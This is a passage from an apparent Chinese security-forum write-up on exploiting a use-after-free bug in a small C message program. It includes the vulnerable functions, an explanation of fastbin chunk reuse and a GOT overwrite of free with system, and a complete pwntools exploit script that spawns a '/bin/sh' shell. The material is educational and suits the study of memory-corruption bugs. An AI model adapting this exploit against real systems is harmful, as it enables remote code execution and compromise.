
```
void delete_msg(struct Message * delmsg) {

	//delete linked list msg and free

	struct Message* tmp = head;

	while (tmp->nextMsg != delmsg) {

		tmp = tmp->nextMsg;

	}

	tmp->nextMsg = delmsg->nextMsg;

	//free

	free(delmsg->author);

	free(delmsg->content);

	free(delmsg->title);

	free(delmsg);

}

```

`delete_msg`函数中对节点进行了`free`操作，如果在循环代码中，进行`delete`操作，释放节点后，在选择 2 进入`modify_msg`函数，`modify_msg`会根据用户输入的内容，重新分配堆内存。

`modify_msg`函数如下：

```
void modify_msg(struct Message * modifymsg) {

	int size = 0;

	char temp[0x100];



	write(STDOUT_FILENO, "input new name len:\n", 20);

	size = read_input_uint(input_buffer, sizeof(input_buffer),

			sizeof(input_buffer));

	if (size > 0x100)

		return;

	write(STDOUT_FILENO, "input new name:\n", 16);

	read_input(temp, size, 0x100);

	memcpy(modifymsg->author, temp, size);

	modifymsg->author_size= size;



	write(STDOUT_FILENO, "input new title len:\n", 21);

	size = read_input_uint(input_buffer, sizeof(input_buffer),

			sizeof(input_buffer));

	if (size > 0x100)

		return;

	write(STDOUT_FILENO, "input new title:\n", 17);

	read_input(temp, size, 0x100);

	memcpy(modifymsg->title, temp, size);

	modifymsg->title_size= size;



	write(STDOUT_FILENO, "input new content len:\n", 23);

	size = read_input_uint(input_buffer, sizeof(input_buffer),

			sizeof(input_buffer));

	if (size > 0x100)

		return;

	write(STDOUT_FILENO, "input new content:\n", 19);

	read_input(temp, size, 0x100);

	modifymsg->content = (char *) malloc(size);          //新分配一个content

	memcpy(modifymsg->content, temp, size);

	modifymsg->content_size= size;

}

```

`modify_msg`函数从用户读取数据，然后拷贝到对应的指针中，但此时使用的是一个已经释放的`msg`结构指针。当输入`content`时，会取`content`的长度作为大小分配内存，当分配内存大小等于`msg`结构大小（x86上是40字节，会将刚才释放的内存分配给`content`指针。此外由于`msg`结构指针刚好是40个字节，再给`msg`分配堆内存时，由于需要8字节对齐，而40个字节+8字节[`prev_size+size`]，刚好8字节对齐，另外由于40字节，在堆中属于`fastbin`管理，不会发生合并，`free`后再分配时，就会返回相同的堆块）。

接着会将用户输入的内容（`content`）拷贝到`content`指针中，即我们构造的恶意内容，覆盖了原来的`Message`中的`char* author`、`char* title`等地址内容。

整个`msg`变化过程，如下图所示：

![](https://bbs.kanxue.com/upload/attach/201709/591834_xtedp446ornnzuo.png)

在循环代码中，`modify_msg`完之后可以继续进入`modify_msg`，此时`msg`中相关地址，如`author`、`title`和`content`地址已经变成`free`函数在`got`表中的位置，也就是我们输入的内容可以覆盖`GOT`表！我们把`free`函数的`GOT`表地址覆盖成`system`函数地址，下次在执行`free`函数时，就会执行`system`函数，从而达到命令执行。

最终漏洞的exp代码如下：

```
#!/usr/bin/env python

from pwn import *



__author__="daizy"



def add_new_msg(cmd, name_len, name, title_len, title, content_len, content):

        p.recvuntil("\n")

        cmd = str(cmd)+ "\n"

        p.send(cmd)

        p.recvuntil("\n")	#input name size

        p.send(str(name_len) + "\n")

        p.recvuntil("\n")  # input name

        p.send(name + "\n")

	p.recvuntil("\n")	#input title size

        p.send(str(title_len) + "\n")

        p.recvuntil("\n")  # input title

        p.send(title + "\n")

	p.recvuntil("\n")	#input content size

        p.send(str(content_len) + "\n")

        p.recvuntil("\n")  # input content

        p.send(content + "\n")

def print_msg(cmd, msg_index):

        p.recvuntil("\n")

        cmd = str(cmd)+ "\n"

        p.send(cmd)

	p.recvuntil("\n")

        cmd = str(msg_index)+ "\n"

        p.send(cmd)

	p.recvuntil("\n")	#print msg info

def delete_msg(cmd):

	p.recvuntil("\n")

        cmd = str(cmd)+ "\n"

        p.send(cmd)

def modify_msg(cmd, name_len, name, title_len, title, content_len, content):

	p.recvuntil("\n")

        cmd = str(cmd)+ "\n"

        p.send(cmd)

	p.recvuntil("\n")	#input new name size

        p.send(str(name_len) + "\n")

        p.recvuntil("\n")  # input new name

        p.send(name + "\n")

	p.recvuntil("\n")	#input new title size

        p.send(str(title_len) + "\n")

        p.recvuntil("\n")  # input new title

        p.send(title + "\n")

	p.recvuntil("\n")	#input new content size

        p.send(str(content_len) + "\n")

        p.recvuntil("\n")  # input new content

        p.send(content + "\n")

def back_msg_main(cmd):

        p.recvuntil("\n")

        cmd = str(cmd) + "\n"

        p.send(cmd)



if __name__ == "__main__":

		libc = ELF('libc.so')

		elf = ELF('uaf')

		

		p = process('./uaf')

		#p = remote('127.0.0.1', 15000)

		

		libc_system = libc.symbols['system']

		libc_free = libc.symbols['free']

		offset_sys_free = libc_system - libc_free

		print '\noffset_sys_free= ' + hex(offset_sys_free)

		

		got_free = elf.got['free']

		print '\ngot_free= ' + hex(got_free)

		#step 1 add two msg,msg two's author,title,content is /bin/sh

		print "\nadd new msg"

		add_new_msg(1, 4,"test", 4, "test", 5, "hello")

		add_new_msg(1, 7,"/bin/sh", 7,"/bin/sh", 7,"/bin/sh")

		#step2 print the new msg

		print "\n step2 print msg by msgid"

		print_msg(2, 1)

		#step3 delete the new msg

		print "\n setp3 delete msg"

		delete_msg(1)



		#step4 modify the delete msg

		print "\n step4 modify msg"

		content = "c"*12 + p32(got_free) + "c"*4+p32(got_free) + "c"*4+p32(got_free) + "c"*8

		modify_msg(2, 4, "test", 4, "test", 40, content)

		#step5 calculate system address and second modify the delete msg to write system address to got.free

		print "\nstep5 calculate system address and write to got.free"

		free_addr = int(raw_input("free address:"), 16)

		system_addr = free_addr + offset_sys_free

		modify_msg(2, 4, p32(system_addr), 4, p32(system_addr), 4, p32(system_addr))

		

		#step 6 exit msg operate and back to add new msg

		print "\nback to msg main"

		back_msg_main(4)

		#step 7 free('/bin/sh') ->system('/bin/sh')

		print "\nfree('/bin/sh') ->system('/bin/sh')"

		#print "\nprint new msg2"

		print_msg(2, 2)

		#print "\n free new msg2->system"

		delete_msg(1)

		p.interactive()

```

由于`print_msg`函数在`modify_msg`函数的上一层，也就是无法通过`print`指定地址上的内容造成信息泄露，所以上述`free`函数的地址是通过运行时，`gdb -pid 5519`获得，得到`free`函数地址后，需要退出`gdb`程序，否则主程序无法进行下一步。

当然也可以通过指定一个`free`函数地址，爆破 n 次，也可以获得成功。

exp运行结果如下：

![](https://bbs.kanxue.com/upload/attach/201709/591834_d5t8toly666k2d0.png)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
